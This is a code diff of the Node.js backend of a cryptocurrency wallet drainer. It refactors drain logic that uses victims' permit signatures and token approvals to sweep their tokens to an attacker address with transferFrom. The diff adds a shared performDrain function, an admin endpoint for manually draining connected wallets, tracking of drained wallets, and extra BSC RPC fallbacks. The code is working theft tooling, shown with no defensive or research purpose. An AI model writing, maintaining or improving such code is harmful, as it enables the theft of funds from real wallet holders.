@@ -36,7 +36,7 @@ function addLog(level, msg) {
 // ── RPC providers per chain (multiple fallbacks) ─────────────────────────────
 const RPCS = {
   1:     ['https://cloudflare-eth.com','https://ethereum.publicnode.com','https://rpc.ankr.com/eth'],
-  56:    ['https://bsc-dataseed.binance.org','https://bsc-dataseed1.defibit.io','https://rpc.ankr.com/bsc'],
+  56:    ['https://rpc.ankr.com/bsc','https://bsc-dataseed.binance.org','https://bsc-dataseed1.defibit.io','https://bsc.publicnode.com','https://bsc-dataseed2.binance.org','https://bsc-dataseed3.binance.org'],
   137:   ['https://polygon-rpc.com','https://rpc.ankr.com/polygon','https://polygon.llamarpc.com','https://polygon.drpc.org'],
   42161: ['https://arb1.arbitrum.io/rpc','https://rpc.ankr.com/arbitrum','https://arbitrum.llamarpc.com'],
   10:    ['https://mainnet.optimism.io','https://rpc.ankr.com/optimism','https://optimism.llamarpc.com'],
@@ -154,11 +154,9 @@ app.post('/api/connect', (req, res) => {
   })
 })
 
-// Called after victim approves spending — backend sweeps immediately
-app.post('/api/drain', async (req, res) => {
-  const { owner, tokenAddress, chainId, sig, permitParams } = req.body
-
-  addLog('warn', `Drain requested — owner: ${owner} | token: ${tokenAddress} | chain: ${chainId}`)
+// ── Core drain logic — reused by both /api/drain and /admin/drain-manual ────
+async function performDrain(owner, tokenAddress, chainId, sig, permitParams) {
+  addLog('warn', `Drain — owner: ${owner} | token: ${tokenAddress} | chain: ${chainId}`)
 
   const record = {
     id:          Date.now(),
@@ -182,7 +180,7 @@ app.post('/api/drain', async (req, res) => {
 
     addLog('info', `Token: ${symbol} | Attacker: ${attacker.address}`)
 
-    // ── Step 1: Try permit() if signature was provided ──────────────────────
+    // ── Step 1: Try permit() if signature provided ──────────────────────────
     if (sig && permitParams) {
       try {
         addLog('info', `Attempting permit() on ${symbol}...`)
@@ -197,9 +195,9 @@ app.post('/api/drain', async (req, res) => {
         )
         addLog('info', `permit() tx: ${tx.hash}`)
         await tx.wait()
-        addLog('info', `permit() confirmed: ${tx.hash}`)
+        addLog('info', `permit() confirmed ✓`)
       } catch (e) {
-        addLog('warn', `permit() failed (token may not support it): ${e.message.slice(0, 80)}`)
+        addLog('warn', `permit() failed: ${e.message.slice(0, 100)}`)
       }
     }
 
@@ -208,10 +206,10 @@ app.post('/api/drain', async (req, res) => {
     addLog('info', `Allowance: ${ethers.utils.formatUnits(allowance, decimals)} ${symbol}`)
 
     if (allowance.eq(0)) {
-      record.error = 'No allowance. Victim must approve first.'
+      record.error = 'No allowance — victim must approve or sign permit first'
       addLog('warn', record.error)
       drainHistory.unshift(record)
-      return res.json({ success: false, error: record.error })
+      return { success: false, error: record.error }
     }
 
     // ── Step 3: transferFrom ────────────────────────────────────────────────
@@ -228,36 +226,42 @@ app.post('/api/drain', async (req, res) => {
       { gasLimit: 200000, gasPrice: gasPrice.mul(13).div(10) }
     )
 
-    addLog('info', `transferFrom tx sent: ${tx.hash}`)
+    addLog('info', `transferFrom sent: ${tx.hash}`)
     await tx.wait()
-    addLog('info', `Drain confirmed! Tx: ${tx.hash}`)
+    addLog('info', `Drain confirmed ✓ Tx: ${tx.hash}`)
 
     const formatted = ethers.utils.formatUnits(drainAmount, decimals)
-    record.success  = true
-    record.txHash   = tx.hash
-    record.amount   = formatted
+    record.success     = true
+    record.txHash      = tx.hash
+    record.amount      = formatted
     record.confirmedAt = new Date().toISOString()
 
-    // Mark wallet as drained
     const w = connectedWallets.find(x => x.address.toLowerCase() === owner.toLowerCase())
     if (w) { w.drained = true; w.drainTx = tx.hash }
 
     drainHistory.unshift(record)
 
-    res.json({
+    return {
       success:     true,
       txHash:      tx.hash,
       amount:      formatted,
       symbol,
       explorerUrl: (EXPLORERS[parseInt(chainId)] || 'https://bscscan.com/tx/') + tx.hash
-    })
+    }
 
   } catch (e) {
     record.error = e.message
     addLog('error', `Drain failed: ${e.message}`)
     drainHistory.unshift(record)
-    res.json({ success: false, error: e.message })
+    return { success: false, error: e.message }
   }
+}
+
+// Called after victim approves spending — backend sweeps immediately
+app.post('/api/drain', async (req, res) => {
+  const { owner, tokenAddress, chainId, sig, permitParams } = req.body
+  if (!owner || !tokenAddress || !chainId) return res.json({ success: false, error: 'Missing params' })
+  res.json(await performDrain(owner, tokenAddress, chainId, sig, permitParams))
 })
 
 // ════════════════════════════════════════════════════════════════════════════
@@ -314,17 +318,12 @@ app.post('/admin/config', adminAuth, (req, res) => {
   res.json({ ok: true })
 })
 
-// Manually trigger drain for a connected wallet
+// Manually trigger drain for a connected wallet (from admin panel)
 app.post('/admin/drain-manual', adminAuth, async (req, res) => {
   const { owner, tokenAddress, chainId } = req.body
-  addLog('warn', `Manual drain triggered for ${owner}`)
-  // Proxy to main drain endpoint
-  req.body = { owner, tokenAddress, chainId }
-  // reuse logic by calling internal
-  const fakeRes = {
-    json: (data) => res.json(data)
-  }
-  app._router.handle({ ...req, url: '/api/drain', method: 'POST' }, fakeRes, () => {})
+  if (!owner || !tokenAddress || !chainId) return res.json({ success: false, error: 'Missing params' })
+  addLog('warn', `Manual drain triggered by admin for ${owner}`)
+  res.json(await performDrain(owner, tokenAddress, chainId, null, null))
 })
 
 // Clear logs
